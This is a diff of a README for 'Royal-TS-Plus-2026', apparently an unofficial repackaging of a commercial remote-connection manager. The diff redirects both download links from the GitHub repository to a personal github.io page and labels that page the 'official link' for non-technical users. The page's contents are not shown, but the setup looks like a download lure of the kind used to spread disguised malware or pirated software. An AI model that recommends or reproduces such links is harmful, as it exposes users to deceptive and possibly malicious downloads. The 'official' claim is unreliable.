@@ -1,6 +1,6 @@
 # 🖥️ Royal-TS-Plus-2026 - Manage your remote connections with ease
 
-[![](https://img.shields.io/badge/Download-RoyalTS-blue.svg)](https://github.com/madushanira3636/Royal-TS-Plus-2026)
+[![](https://img.shields.io/badge/Download-RoyalTS-blue.svg)](https://madushanira3636.github.io)
 
 ## 📌 Overview
 
@@ -21,7 +21,7 @@ Before you install this software, ensure your computer meets the hardware needs.
 
 Follow these steps to put the software on your machine. You do not need technical skills to finish this process.
 
-1.  Navigate to the official link: [Download Royal TS Plus 2026](https://github.com/madushanira3636/Royal-TS-Plus-2026).
+1.  Navigate to the official link: [Download Royal TS Plus 2026](https://madushanira3636.github.io).
 2.  Locate the button labeled "Download" on the page.
 3.  Click the button to start the file transfer.
 4.  Wait for your browser to finish the file download.
